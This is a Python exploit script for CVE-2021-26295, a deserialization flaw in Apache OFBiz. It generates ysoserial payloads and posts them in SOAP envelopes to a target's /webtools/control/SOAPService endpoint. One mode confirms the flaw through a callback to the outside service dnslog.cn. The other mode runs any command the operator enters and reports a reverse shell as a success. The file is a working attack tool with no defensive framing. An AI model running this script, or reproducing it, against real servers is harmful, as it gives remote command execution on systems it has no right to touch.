import subprocess
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def dnslog():
    global dns_session
    dns_session = requests.session()
    dns = dns_session.get('http://www.dnslog.cn/getdomain.php')
    return dns.text


def dnslog_res():
    dns_res = dns_session.get('http://www.dnslog.cn/getrecords.php')
    if dns_res.json():
        return True
    else:
        return False


def CVE_2021_26295(target_url):
    target_url = target_url.strip()
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'Content-Type': 'application/xml'}
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", 'http://' + dnslog()], stdout=subprocess.PIPE)
    data = popen.stdout.read().hex().upper()
    post_data = f'''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><yuaneuro:clearAllEntityCaches xmlns:yuaneuro="http://ofbiz.apache.org/service/"><yuaneuro:cus-obj>{data}</yuaneuro:cus-obj></yuaneuro:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''
    if target_url.startswith('https://'):
        vuln_url = target_url + "/webtools/control/SOAPService"
    else:
        vuln_url = 'https://' + target_url + "/webtools/control/SOAPService"
    try:
        r = requests.post(vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            sleep(2)
            if dnslog_res():
                print(f'\033[36m[+] {target_url} CVE_2021_26295 dnslog验证成功 \033[0m')
                return True
            else:
                print(f'\033[31m[x] {target_url} CVE_2021_26295 利用失败 \033[0m')
    except Exception:
        print(f"\033[31m[x] {target_url} CVE_2021_26295 poc请求超时 \033[0m")


def CVE_2021_26295_shell(target_url, cmd):
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'Content-Type': 'application/xml'}
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "ROME", cmd], stdout=subprocess.PIPE)
    data = popen.stdout.read().hex().upper()
    post_data = f'''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><yuaneuro:clearAllEntityCaches xmlns:yuaneuro="http://ofbiz.apache.org/service/"><yuaneuro:cus-obj>{data}</yuaneuro:cus-obj></yuaneuro:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''
    if target_url.startswith('https://'):
        vuln_url = target_url + "/webtools/control/SOAPService"
    else:
        vuln_url = 'https://' + target_url + "/webtools/control/SOAPService"
    try:
        r = requests.post(vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            sleep(2)
            print(f'\033[36m[+] {target_url} CVE_2021_26295 反弹shell成功 \033[0m')
            return True
        else:
            print(f'\033[31m[x] {target_url} CVE_2021_26295 利用失败 \033[0m')
    except Exception:
        print(f"\033[31m[x] {target_url} CVE_2021_26295 请求失败 \033[0m")


if __name__ == '__main__':
    a = input('poc or shell:')
    if a == 'poc':
        print('CVE_2021_26295_poc')
        url = str(input("\033[35mInput Url >>> \033[0m"))
        if url:
            CVE_2021_26295(url)
    else:
        print('CVE_2021_26295_shell')
        url = str(input("\033[35mInput Url >>> \033[0m"))
        cmd = str(input("\033[35mcmd >>> \033[0m"))
        if url:
            CVE_2021_26295_shell(url, cmd)
